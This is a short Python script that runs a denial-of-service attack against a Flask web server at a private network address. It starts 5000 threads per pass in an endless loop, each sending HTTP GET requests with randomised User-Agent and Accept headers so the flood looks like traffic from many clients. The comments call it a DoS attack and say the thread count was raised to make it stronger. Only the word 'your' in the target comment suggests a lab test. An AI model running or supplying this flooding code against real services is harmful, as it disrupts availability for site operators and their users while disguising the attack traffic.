import requests
import threading
import random

# The target URL of your Flask web server
target_url = "http://192.168.104.4:5000/"

# List of random user agents to simulate different clients
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

# List of common Accept headers to simulate different request types
accept_headers = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8",
    "application/json;q=0.9,/;q=0.8",
    "text/plain;q=0.9,/;q=0.8",
]

# Function to perform a single HTTP GET request
def send_request():
    try:
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': random.choice(accept_headers),
            'Connection': 'keep-alive'
        }
        response = requests.get(target_url, headers=headers)
        print(f"Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

# Function to continuously perform a DoS attack by sending requests in a loop
def perform_dos_attack(thread_count):
    while True:  # Loop to keep the attack running
        for _ in range(thread_count):
            thread = threading.Thread(target=send_request)
            thread.start()

if __name__ == "__main__":
    # Number of threads (requests) to send simultaneously
    num_threads = 5000  # Increased the number of threads for more powerful attack

    print("Starting DoS attack...")
    perform_dos_attack(num_threads)